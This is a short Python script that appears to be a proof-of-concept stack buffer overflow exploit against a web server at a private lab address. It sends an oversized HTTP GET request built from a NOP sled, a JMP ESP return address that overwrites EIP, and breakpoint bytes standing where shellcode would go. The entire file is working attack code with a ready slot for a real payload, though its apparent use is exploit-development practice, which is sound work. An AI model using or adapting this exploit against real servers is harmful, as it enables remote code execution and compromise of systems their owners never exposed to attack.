#!/usr/bin/python
import socket

target_address="172.16.189.162"
target_port=80

# JMP ESP @ 7C9D30D7

buffer = "GET "
buffer+= "\x90" * 1787
buffer+= "\xD7\x30\x9D\x7C" # overwrite EIP to 7C9D30D7
buffer+= "\xcc" * (2220 - len(buffer)) # overwrite ESP
buffer+= " HTTP/1.1\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()

